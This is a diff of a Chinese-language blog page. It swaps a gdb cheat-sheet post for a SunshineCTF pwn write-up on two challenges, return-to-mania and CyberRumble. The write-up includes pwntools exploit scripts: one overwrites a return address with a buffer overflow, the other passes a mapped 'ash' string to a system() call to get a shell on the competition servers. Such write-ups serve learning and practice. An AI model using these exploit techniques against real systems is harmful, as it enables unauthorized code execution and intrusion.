@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="其他," />
+  <meta name="keywords" content="ctf,writeup,pwn," />
 
 
 
@@ -79,18 +79,24 @@
 
 
 
-<meta name="description" content="下面列出一些使用gdb调试经常会用的到的一些命令，一时健忘了想不起来还可以过来看看(￣ε (#￣)∑">
-<meta name="keywords" content="其他">
+<meta name="description" content="return-to-mania 和 CyberRumble，考察普通溢出，还有脑洞。。。。">
+<meta name="keywords" content="ctf,writeup,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用gdb调试的基本方法">
-<meta property="og:url" content="http://yoursite.com/2018/09/11/使用gdb调试的基本方法/index.html">
+<meta property="og:title" content="sunshineCTF">
+<meta property="og:url" content="http://yoursite.com/2019/04/01/sunshineCTF/index.html">
 <meta property="og:site_name" content="Muirelle的博客">
-<meta property="og:description" content="下面列出一些使用gdb调试经常会用的到的一些命令，一时健忘了想不起来还可以过来看看(￣ε (#￣)∑">
+<meta property="og:description" content="return-to-mania 和 CyberRumble，考察普通溢出，还有脑洞。。。。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-10-07T03:08:19.546Z">
+<meta property="og:image" content="https://i.imgur.com/62pNkcS.png">
+<meta property="og:image" content="https://i.imgur.com/og78OMV.png">
+<meta property="og:image" content="https://i.imgur.com/48FoCyV.png">
+<meta property="og:image" content="https://i.imgur.com/b8nCXPL.png">
+<meta property="og:image" content="https://i.imgur.com/h7j2psy.png">
+<meta property="og:updated_time" content="2019-04-01T13:51:46.158Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="使用gdb调试的基本方法">
-<meta name="twitter:description" content="下面列出一些使用gdb调试经常会用的到的一些命令，一时健忘了想不起来还可以过来看看(￣ε (#￣)∑">
+<meta name="twitter:title" content="sunshineCTF">
+<meta name="twitter:description" content="return-to-mania 和 CyberRumble，考察普通溢出，还有脑洞。。。。">
+<meta name="twitter:image" content="https://i.imgur.com/62pNkcS.png">
 
 
 
@@ -120,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/11/使用gdb调试的基本方法/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/01/sunshineCTF/"/>
 
 
 
 
 
-  <title>使用gdb调试的基本方法 | Muirelle的博客</title>
+  <title>sunshineCTF | Muirelle的博客</title>
   
 
 
@@ -253,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/11/使用gdb调试的基本方法/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/01/sunshineCTF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Muirelle">
@@ -270,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">使用gdb调试的基本方法</h1>
+          <h1 class="post-title" itemprop="name headline">sunshineCTF</h1>
         
 
         <div class="post-meta">
@@ -282,8 +288,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-11T18:05:12+08:00">
-                2018-09-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T21:13:08+08:00">
+                2019-04-01
               </time>
             
 
@@ -293,6 +299,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -300,7 +328,7 @@
 
           
           
-             <span id="/2018/09/11/使用gdb调试的基本方法/" class="leancloud_visitors" data-flag-title="使用gdb调试的基本方法">
+             <span id="/2019/04/01/sunshineCTF/" class="leancloud_visitors" data-flag-title="sunshineCTF">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -331,54 +359,22 @@
       
 
       
-        <p>下面列出一些使用gdb调试经常会用的到的一些命令，一时健忘了想不起来还可以过来看看(￣ε (#￣)∑</p>
+        <p><strong>return-to-mania</strong> 和 <strong>CyberRumble</strong>，考察普通溢出，还有脑洞。。。。</p>
 <a id="more"></a>
-<pre><code>(gdb) file &lt;文件名&gt;    #加载被调试的可执行程序文件
-
-(gdb) r(un)    #运行被调试的程序。若中途遇到断点则暂停在断点处
-
-(gdb) c(ontinue) #继续执行被调试程序，直至下一个断点或程序结束
-
-(gdb) b(reakpoint) &lt;函数名&gt;/*&lt;地址名&gt;/&lt;行号&gt;#设置断点
-
-(gdb) d(elete breakpoint) &lt;断点的编号&gt; #删除断点
-
-(gdb) si/ni #都是执行一行汇编源代码，si会进入函数，ni不会。
-这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。
-
-(gdb) p(rint) &lt;变量名称&gt; #显示指定变量（临时变量或全局变量）的值
-
-(gdb) help &lt;命令名称&gt; #GDB帮助命令，提供对GDB名种命令的解释说明
-
-(gdb) i(nfo) #显示各类信息，具体内容查阅“help i”
-
-(gdb) q(uit) #退出gdb
-
-(gdb) (e)x(amine)/{COUNT}{FMT}{SIZE} {ADDRESS}    #按照一定的格式打印内存地址处的数据
-    {COUNT}: 打印的数目，默认为1。
-    {FMT}: 打印的格式1，默认为上次使用的{FMT}: 
-    o(octal): 8进制整数
-    x(hex): 16进制整数
-    d(decimal): 10进制整数
-    u(unsigned decimal): 10进制非负整数
-    t(binary): 2进制整数
-    f(float): 浮点数
-    a(address): 输出相对于前面最近的符号的偏移
-    i(instruction): 输出地址处的汇编指令
-    c(char): 字符
-    s(string): c字符串(null-terminated string)
-    z(hex, zero padded on the left): 见说明
-    {SIZE}: 打印的字节数目，默认为上次使用的{SIZE}: 
-    b(byte): 1个字节
-    h(halfword): 2个字节
-    w(word): 4个字节
-    g(giant, 8 bytes): 8个字节
-    {ADDRESS}: 目标地址
-    比如：(gdb) x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，
-    3表示输出三个单位，u表示按无符号十进制显示。
-</code></pre><p>最后顺便说一下编译c文件的命令</p>
-<pre><code>gcc （需要编译的c源文件名）-o (编译后的可执行文件名)
-</code></pre><p>比如要把test.c编译成test，用gcc test.c -o test就可以了</p>
+<h1 id="return-to-mania"><a href="#return-to-mania" class="headerlink" title="return-to-mania"></a>return-to-mania</h1><p><img src="https://i.imgur.com/62pNkcS.png" alt=""></p>
+<p>没开canary，好说</p>
+<p><img src="https://i.imgur.com/og78OMV.png" alt=""><br>进来，看到给出了welcome地址，所以pie相当于没开。</p>
+<p><img src="https://i.imgur.com/48FoCyV.png" alt=""><br>思路：通过偏移计算出maina的地址，覆盖welcome返回地址，拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">r = remote(&apos;ret.sunshinectf.org&apos;,4301)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;(): &apos;)</span><br><span class="line"></span><br><span class="line">mania_addr = int(r.recvuntil(&apos;\n&apos;)[:7]+&apos;65d&apos;, 16)</span><br><span class="line"></span><br><span class="line">print(hex(mania_addr))</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x12 + &apos;aaaa&apos; + p32(mania_addr) </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">print(r.recv())</span><br></pre></td></tr></table></figure>
+<h1 id="CyberRumble"><a href="#CyberRumble" class="headerlink" title="CyberRumble"></a>CyberRumble</h1><p><img src="https://i.imgur.com/b8nCXPL.png" alt=""><br>全开- -</p>
+<p>整个main由几个不同功能的函数构成，排除掉没什么用的函数，分析一下剩下的几个比较有意思的函数。</p>
+<p>输入每个函数对应的字符串后面加上自己的参数就可以自己选择函数进入了</p>
+<p><strong>tombstone_piledriver</strong>：这个函数将参数作为文件打开，读取其内容并返回给用户。自然想到用来打开flag.txt，可是发现无论如何只能打印flag的前一个单词，所以没办法用它来拿flag。</p>
+<p><strong>old_school</strong>：这个函数接收一串shellcode并返回该shellcode的地址，同时通过<code>mprotect(dest, len, 1);</code>将其权限设置为只读。所以我们并不能直接用这个函数来执行我们的shellcode。</p>
+<p><strong>last_ride</strong>：接收一串shellcommand，并运行。如果我们输入诸如<code>sh</code>之类的shellcommand，发现执行不了，仔细查看伪代码会发现这里有个小漏洞，传给system的参数并不是shellcommand的地址，而是直接将shellcommand传过去了。由此可以联想到通过<strong>old_school</strong>放置我们想要执行的shellcommand，再将其地址作为参数传给<strong>last_ride</strong>。</p>
+<p>还有一个小细节需要注意，就是<strong>old_school</strong>mmap的一块新地址的最后12bit是0，直接使用该地址会导致我们的地址被\x00截断，所以部署shellcommand之前要一小块padding。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'rumble.sunshinectf.org'</span>,<span class="number">4300</span>)</span><br><span class="line"></span><br><span class="line">shellcode_ = <span class="string">'old_school '</span></span><br><span class="line">shellcommand = <span class="string">'last_ride '</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'old_school ash'</span>)</span><br><span class="line"></span><br><span class="line">addr = int(r.recvuntil(<span class="string">'.\n'</span>)[<span class="number">-16</span>:<span class="number">-2</span>], <span class="number">16</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'[y/n] '</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'U'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'last_ride '</span> + p64(addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/h7j2psy.png" alt=""></p>
 
       
     </div>
@@ -396,7 +392,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/其他/" rel="tag"># 其他</a>
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -409,8 +409,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/10/实验8-分析一个奇怪的程序/" rel="next" title="实验8-分析一个奇怪的程序">
-                <i class="fa fa-chevron-left"></i> 实验8-分析一个奇怪的程序
+              <a href="/2019/03/13/UTctf2019/" rel="next" title="UTctf2019">
+                <i class="fa fa-chevron-left"></i> UTctf2019
               </a>
             
           </div>
@@ -418,10 +418,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/03/Liveoverflow-0x0E-Shellcode/" rel="prev" title="Liveoverflow-0x0E-Shellcode">
-                Liveoverflow-0x0E-Shellcode <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -473,8 +469,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -534,6 +539,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#return-to-mania"><span class="nav-number">1.</span> <span class="nav-text">return-to-mania</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CyberRumble"><span class="nav-number">2.</span> <span class="nav-text">CyberRumble</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
